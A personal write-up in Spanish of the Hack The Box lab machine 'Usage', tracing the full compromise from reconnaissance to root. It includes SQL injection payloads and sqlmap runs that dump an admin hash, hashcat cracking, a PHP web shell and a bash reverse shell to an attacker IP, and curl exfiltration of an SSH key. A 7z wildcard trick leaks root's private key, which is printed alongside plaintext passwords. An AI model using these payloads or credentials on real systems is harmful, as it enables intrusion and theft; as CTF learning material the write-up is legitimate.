Discovery
-------------------------


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

añadimos usage.htb al hosts 

la web tiene diversos formularios y nos lleva otro subdominio admin.usage.htb

añadimos el subdominio

probamos logins en admin pero no sale nada

vamos a continuar a buscar directorios accesibles y más subdominios

no se encuentran más subdirectorios ni más dominios, solo tenemos la web el subdominio admin, y el ssh

-----------------------

Como parece que no tenemos información relevante para atacar por ningún lado, vamos a comprobar los formularios con burpsuite

Pruebo varias consultas SQLi

' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -

Con esta consigo en la de recuperación de mail un error 500

pruebo con otras veo que algunas querys si nos dan el error, por lo tanto modifcan la consultas

' UNION SELECT password FROM Users WHERE username='admin'--
' UNION SELECT NULL,NULL--

' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- abcdef -> FUNCIONA esta, sabemos que son 8 parametros
UNION ALL SELECT id,name,password,NULL,NULL,NULL,NULL,NULL from users-- abcdef

_token=1gvT07wDItSoFbxmbCIVJoGHrmny7n6xiOUU2Agn&email=admin2%40admin.es' UNION ALL SELECT id,name,password,NULL,NULL,NULL,NULL,NULL from users-- abcdef

Parece ser una inyección con UNION SELECT, pero no consigo nada manualmente

Así que utilizo el sqlmap
sqlmap -r req --dbs --level 5 --risk 1 --batch

    [17:47:21] [INFO] testing for SQL injection on POST parameter '_token'
    sabemos que el parámetro es email, entonces ahorramos tiempo poniendolo

sqlmap -r req --level 1 --risk 3 --batch -p email --dbs

    con esto en teoría lo dejamos funcionar y vamos sacando todos los resultados

    sqlmap nos detecta exactamente lo que habíamos comprobado
    [17:54:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [17:54:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
    [17:54:32] [INFO] target URL appears to have 8 columns in query
    [17:56:06] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 

    para la siguiente pasada forzamos mysql
    nos da fallo y tneemo que subir el nivel algo más, añadimos mas verbosity para ver que pasa

    [18:06:02] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
    [18:09:31] [INFO] retrieved: performance_schema

    Volvemos a pasar después de un fallo pero ya optimizamos un poco más y añadimos hilos y seleccionamos el dbms, aunque le vamos a dar caña a la bbdd

    Finalmente nos acaba sin usar los threads, pero añadiremos para la siguiente consulta
    available databases [3]:
    [*] information_schema
    [*] performance_schema
    [*] usage_blog

sqlmap -r req --level 2 --risk 3 --batch -p email --dbms=mysql -vvv --threads 4 -D usage_blog --tables

    [18:12:11] [INFO] retrieved: admin_menu
    Parece que va más rápido y funciona bien sacando info lo dejamos un rato pequeño
    Mientras un ejemplo de las consultas que está lanzando sqlmap
    [18:17:06] [PAYLOAD] admin2@admin.es' AND 6426=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x75736167655f626c6f67 LIMIT 7,1),22,1))>114) THEN 6426 ELSE (SELECT 2893 UNION SELECT 8348) END))-- -
    Este payload en concreto funciona y así el script va sacando la información

nos da error y volvemos a lanzar pero esta vez con -vv, incluso ahora con -v así vemos mejor lo que va encontrando sin ver todas las consultas
    un ejemplo de como nos lo enseña en pantalla es así
    [18:20:17] [DEBUG] used the default behavior, running in batch mode
    [18:20:21] [INFO] retrieved: n_user_ 6/7 (85%)
    [18:20:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
    [18:20:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
    [18:20:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
    [18:20:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
    [18:20:26] [INFO] retrieved: admin_users       
    [18:20:26] [DEBUG] performed 13 queries in 9.24 seconds

realmente queremos atacar a esa tabla en la siguiente pasada, no necesitaríamos más, bajamos los threads a 2 para evitar fallos

    Database: usage_blog
    [15 tables]
    +------------------------+
    | admin_menu             |
    | admin_operation_log    |
    | admin_permissions      |
    | admin_role_menu        |
    | admin_role_permissions |
    | admin_role_users       |
    | admin_roles            |
    | admin_user_permissions |
    | admin_users            |
    | blog                   |
    | failed_jobs            |
    | migrations             |
    | password_reset_tokens  |
    | personal_access_tokens |
    | users                  |
    +------------------------+

en principio nos interesa la tabla admin_users y users
sqlmap -r req --level 2 --risk 3 --batch -p email --dbms=mysql -v --threads 2 -D usage_blog -T admin_users --columns

en esta parte el sql no es muy eficiente, podemos probar como al principio y buscar por campos obvios como username, name, password, etc..
pero dejo los 40 minutos de ejecución que me lleva

Database: usage_blog
Table: admin_users
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| name           | varchar(255) |
| avatar         | varchar(255) |
| created_at     | timestamp    |
| id             | int unsigned |
| password       | varchar(60)  |
| remember_token | varchar(100) |
| updated_at     | timestamp    |
| username       | varchar(190) |
+----------------+--------------+

sqlmap -r req --level 2 --risk 3 --batch -p email --dbms=mysql -v --threads 2 -D usage_blog -T admin_users -C name,username,password --dump

Database: usage_blog
Table: admin_users
[1 entry]
+---------------+----------+--------------------------------------------------------------+
| name          | username | password                                                     |
+---------------+----------+--------------------------------------------------------------+
| Administrator | admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+---------------+----------+--------------------------------------------------------------+

hashcat -m 3200 -o ./output.txt '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

whatever1

pues con esto ya podemos probar a logearnos como admin

Tenemos acceso a un log

{
    "name": "Administrator",
    "password": "$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK",
    "password_confirmation": "$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK"
}

john pass --show
?:admin

el ?: hace referencia al usuario

no parece que podemos logear en ssh con ninguno de los 2 passwords

-----------------

http://admin.usage.htb/admin/auth/setting

podemos incluir un fichero pero la web checkea la extensión

Básicamente con intruder y antes de que expire la sesion incluyo un php para ejecutar

<form action="<?php $PHP_SELF ?>" method="post">
Command: <input type="text" name="cmd">
<input type="submit">
</form>
<?php
    if($_POST){
        system($_POST['cmd']);
    }
?>

ahora podemos ejecutar comandos desde 

http://admin.usage.htb/uploads/images/shell.php

el siguiente paso es ejecutar un nc

nc 10.10.x.x 4455

Finalmente no me funciona bien, y pruebo con el siguiente código en el Request para conectar directo

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.24/4455 0>&1'");

Y obtenemos la bandera de usuario y vemos que hay otro usuario llamado xander 
-----------------------------------------------------


también vemos más usuario clamav, el av posiblemente y _laurel

solo xander tiene /bin/bash

Ejecuto linpeas.sh

ejecuto linpeas.sh -a > output.txt

aprovecho el servidor de python para subirme el txt

    creo un pequeño script para hacer un servidor http que acepte post, más adelante le daré una vuelta a ese pequeño proyecto
    curl -F 'file=@output.txt' 10.10.x.x:4433/ -v

    aprovechamos y copiamos la key de dash, tenemos acceso por ssh ahora
    curl -F 'file=@/home/dash/.ssh/id_rsa' 10.10.x.x:4433/ -v

    chmod 600 id_rsa
    ssh -i id_rsa dash@10.129.x.x

Y tenemos acceso por ssh si queremos

Después de algo de tiempo, revisando los archivos veo que el archivo .monitrc tiene un pass

allow admin:3nc0d3d_pa$$w0rd

no sirve para admin, pero si es la credencial de xander

sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

bueno hay que ver que hace usage_management

Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 3

probamos a resetear el pass, y su admin, administrator, root, etc... y nada

Error:
cannot open file
/var/backups/project.zip
Permission denied

me da error lo ejecuto con sudo al tener suid

nos comprime y aparece en la ruta que indica

hace una copia de usage y project manager me voy a la ruta de las webs

xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa admin_rsa
xander@usage:/var/www/html$ ll
total 16
drwxrwxrwx  4 root   xander 4096 Jul 23 17:55 ./
drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ../
lrwxrwxrwx  1 xander xander   17 Jul 23 17:55 admin_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15 project_admin/
drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15 usage_blog/

hago un enlace simbolico y ejecuto el script

No soy capaz de leer el archivo

Revisando un poco y con algo de ayuda llego a esto

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z

no andaba lejos

hago un touch @id_rsa
luego un enlace simbolico ln -l /root/.ssh/id_rsa id_rsa
luego ejecuto el script y me dará los warnings

Files read from disk: 17946
Archive size: 54830037 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7

y ya con eso sencillamente ssh con la key y entramos por la puerta grande

